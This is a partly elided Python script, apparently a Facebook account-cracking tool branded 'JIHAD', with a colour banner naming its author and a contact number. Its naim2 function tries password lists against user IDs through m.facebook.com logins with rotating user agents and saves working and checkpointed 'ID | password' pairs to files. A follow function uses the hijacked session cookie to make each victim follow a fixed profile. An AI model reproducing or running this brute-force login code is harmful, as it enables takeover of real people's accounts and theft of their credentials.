...
logo = ("""
\033[38;5;46m       _ _____ _    _          _____  
\033[38;5;46m      | |_   _| |  | |   /\   |  __ \ 
\033[38;5;46m      | | | | | |__| |  /  \  | |  | |
\033[38;5;46m  _   | | | | |  __  | / /\ \ | |  | |
\033[38;5;46m | |__| |_| |_| |  | |/ ____ \| |__| |
\033[38;5;46m  \____/|_____|_|  |_/_/    \_\_____/ 
                                      
\033[38;5;46m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
\033[38;5;46m┃ \x1b[38;5;196m√ADMIN\x1b[38;5;196m   :\x1b[1;96   GAZIPUR X JIHAD           \033[38;5;46m┃
...
\033[38;5;46m┣━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━┫
\033[38;5;46m┃ \033[33;1mGITHUB  \x1b[38;5;196m: \x1b[38;5;208mGAZIPUR-450    \033[38;5;46m┃\033[33;1m BD:RANDOM \033[38;5;46m┃
\033[38;5;46m┃ \x1b[1;96mWATHSAPP\x1b[38;5;196m: \033[1;97m+8801735569550 \033[38;5;46m┃\033[1;97m\033[1;45mVersion 1.2\033[1;0m\033[1;97m\033[38;5;46m┃
...
def fuck():
    ...
    print('\033[1;30m───────────────────────────────────────────')
    print(' [+] OK Ids saved in JIHAD/OK.txt')
    print(' [+] CP Ids saved in JIHAD /CP.txt')
    print('\033[1;30m───────────────────────────────────────────')
    
agents=[]
def follow(ses,coki):
    ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    r = sop(ses.get('https://m.facebook.com/profile.php?id=100007373957944', cookies={'cookie': coki}).text, 'html.parser')
    get = r.find('a', string='Follow').get('href')
    ses.get(('https://m.facebook.com' + str(get)), cookies={'cookie': coki}).text
def naim2(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r [JIHAD]-[%s|%s]\33[1;92m[OK:%s]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            m_fb = session.get('https://m.facebook.com/?tbua=1').text
            log_data = {
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
               ...
               # print (f"\033[1;31m[\033[1;32m✓\033[1;31m]\033[1;32m COOKIES: {coki} ")
                open('JIHAD-OK.txt', 'a').write(cid+' | '+ps+'\n')
                ...
                open('JIHAD-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
